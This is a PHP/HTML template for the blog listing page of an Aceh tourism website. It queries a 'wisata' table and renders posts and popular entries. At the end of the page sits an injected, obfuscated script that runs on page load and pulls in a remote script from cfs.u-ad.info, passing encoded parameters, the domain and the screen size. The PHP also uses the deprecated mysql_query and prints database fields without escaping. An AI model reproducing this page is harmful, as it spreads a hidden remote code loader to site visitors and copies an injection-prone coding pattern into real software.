...
<head>
	...
	<title> Blogs || Aceh Tour Guide  </title>	
...
<link rel="alternate" type="application/rss+xml" title="Midway - Responsive Travel Theme &raquo; Blog Comments Feed" href="blog/feed" />
...
<body class="page page-id-119 page-template page-template-template-posts-php">
		...
		<header class="container site-header">
			...
			<div class="row supheader">
				...
				<div class="social-links">
					<a class="facebook" href="#"  title="Facebook"></a><a class="twitter" href="#" title="Twitter"></a><a class="Login" href="login.php" title="Logout"></a>				</div>
				<!-- social links -->
...
<li id="menu-item-121" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-96 current_page_item current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-97"><a href="blog.php">Blogs</a></li>
		...
		<?php 
		$result = mysql_query("SELECT id_wisata, nama_wisata, gambar, SUBSTRING(  `keterangan` , 1, 350 ) FROM wisata ORDER BY id_wisata DESC LIMIT 3 , 4");
	...
	<div class="column fivecol post-featured-image">
		...
		<a href="<?php echo "tour/wisata.php?id_wisata=" . $row [0]; ?>"><img width="440" height="330" src="Admin/Uploads/<?php echo $row[2] ?>" class="attachment-preview wp-post-image" /></a>		</div>
	</div>
	<div class="column sevencol last">
			<div class="post-content">
			<div class="section-title">
				<h1><a href="<?php echo "tour/wisata.php?id_wisata=" . $row [0]; ?>" ><?php echo $row[1] ?></a></h1>
			</div>
			<p><?php echo $row[3] ?>&nbsp.....</p>
			<a href="<?php echo "tour/wisata.php?id_wisata=" . $row [0]; ?>" class="button small"><span>Read More</span></a>
			</footer>
		</div>
	</div>
</article>	<?php } ?>
	...
	<nav class="pagination">
				<a class='page-numbers' href='blog.php'>1</a>
				<span class='page-numbers current'>2</span>
				<a class='page-numbers' href='blog3.php'>3</a>
				<a class="next page-numbers" href="blog3.php"></a>
	</nav>
</div>

<aside class="column fourcol last">
<div class="widget widget-selected-posts"><div class="section-title"><h4>Popular Posts</h4></div>
<?php 
		$result = mysql_query("SELECT * FROM wisata LIMIT 4 , 4");
		while ($row = mysql_fetch_array($result)) {
		?>
<article class="post-112 post type-post status-publish format-standard hentry category-guides tag-amet tag-dolor tag-lorem post clearfix">
		<div class="post-featured-image">
		<div class="featured-image">
			<a href="<?php echo "tour/wisata.php?id_wisata=" . $row [0]; ?>"><img width="440" height="330" src="Admin/Uploads/<?php echo $row[4] ?>" class="attachment-preview wp-post-image" alt="Mon-Ceunong-Indrapuri-piasan-com3.jpg" /></a>
		</div>
	</div>
	<div class="post-content">
			<h6 class="post-title"><a href="<?php echo "tour/wisata.php?id_wisata=" . $row [0]; ?>" ><?php echo $row[1] ?></a></h6>
		<footer class="post-footer clearfix">
						
						<div class="post-info">
							
				<time datetime="2012-11-24"><?php 
...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlREzkyjWDuWsqnhByWjahp32Sl6HtQNiJDAO6aFRXUZlYlggWQDK6oADBmZeCKVPlVrliDaskJQ8eAoFVn0VAXCr8HwrEKdPeqDcfxoQONWhBDP81RIyokMsDc9Reuq4P1ujz3h%2bkOckBqP71FO3P3Kac3G%2fjloL8lZu3p79eFyMDHMKedF1CV%2fg2nq%2bKhThs14npOT%2fkMlPta5Hv9vYgnZMityXt9vCyojKuBCDhM9FLvjYBXwOhUWt7j2Na6r8rc8tFs3yT%2b2rhvZ3AolSZZXCxQGXM8KLIKERCxVjB6IIkP%2bcBXfXTDaz9i9LMCscbQcYkGFH40Bw48nL1Qnf9eNuCIyr02tOxo%2bVMpG4e84VlaLIpH0DWO5b9v%2bkAzi5Y5cbqLwsi28VBzK3uXQR%2baWM9X6nebqcxdwFg5qUFGqW4bAr52eCoWUwH1W2XS33r8jK2PnO5PA6lTWUB0vH0vyo0HKUFsJrFOmsWD3ugXcWQ%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from themextemplates.com/demo/midway/blog by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 27 May 2015 06:02:12 GMT -->
</html>